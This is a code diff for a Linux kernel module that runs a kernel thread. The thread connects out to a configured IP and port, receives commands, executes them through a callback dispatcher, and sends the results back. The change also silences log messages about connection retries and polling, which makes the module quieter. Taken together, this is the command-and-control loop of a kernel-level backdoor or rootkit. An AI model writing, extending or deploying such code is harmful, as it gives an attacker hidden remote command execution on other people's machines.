@@ -6,6 +6,7 @@
 #include <linux/module.h>
 #include <linux/net.h>
 
+#include "commands.h"
 #include "exec.h"
 
 static struct socket *sock = NULL;
@@ -73,9 +74,9 @@ int network_loop(void *data)
     char resp_buf[1024] = { 0 };
     struct kvec status_vec = { 0 };
     struct msghdr status_msg = { 0 };
-    char status_buf[15];
-    int status = 0;
+    char status_buf[1024];
     struct config *cfg = data;
+    struct command cmd;
 
     // handle response:
     while (kthread_should_stop() == 0)
@@ -89,8 +90,9 @@ int network_loop(void *data)
             while ((r = network_init(cfg->ip, cfg->port)) != 0
                    && kthread_should_stop() == 0)
             {
-                pr_warn(
-                    "network: failed to init socket. trying again in 3s.\n");
+                /* pr_warn( */
+                /*     "network: failed to init socket. trying again in 3s.\n");
+                 */
                 msleep(3000);
             }
         }
@@ -103,7 +105,8 @@ int network_loop(void *data)
         ret = kernel_recvmsg(sock, &resp_msg, &resp_vec, 1, 1023, MSG_DONTWAIT);
         if (ret == -EAGAIN || ret == -EWOULDBLOCK)
         {
-            pr_info("network: no data available. polling again in 1s...\n");
+            /* pr_info("network: no data available. polling again in 1s...\n");
+             */
             msleep(1000);
             continue;
         }
@@ -125,12 +128,12 @@ int network_loop(void *data)
                 "'%s'\n***************\n",
                 resp_buf);
 
-        // TODO: validate content before interpreting it as a cmd to exec
-        if ((ret = exec_sync(resp_buf, &status)) == 0)
+        if ((ret = cmd_build(&cmd, resp_buf)) != 0)
         {
-            pr_info(
-                "network: command ran successfully. sending status back...\n");
-            sprintf(status_buf, "status: %d\n", status);
+            const char *errmsg = "network: couldn't parse payload into a "
+                                 "supported command. dropping message.\n";
+            sprintf(status_buf, "%s", errmsg);
+            pr_err("%s", errmsg);
             status_vec.iov_base = status_buf;
             status_vec.iov_len = strlen(status_buf);
 
@@ -138,16 +141,27 @@ int network_loop(void *data)
                                       status_vec.iov_len))
                 < 0)
             {
-                pr_err("network: couldn't send exit status back: %d\n", ret);
+                pr_err("network: couldn't send status buffer back: %d\n", ret);
                 sock_release(sock);
                 sock = NULL;
                 continue;
             }
+            continue;
         }
-        else
+
+        cmd.callback(cmd.args, status_buf);
+        pr_info("network: command ran successfully. sending status back...\n");
+        status_vec.iov_base = status_buf;
+        status_vec.iov_len = strlen(status_buf);
+
+        if ((ret = kernel_sendmsg(sock, &status_msg, &status_vec, 1,
+                                  status_vec.iov_len))
+            < 0)
         {
-            pr_err("network: couldn't execute `%s` as a shell command.\n",
-                   resp_buf);
+            pr_err("network: couldn't send status buffer back: %d\n", ret);
+            sock_release(sock);
+            sock = NULL;
+            continue;
         }
     }
     return 0;
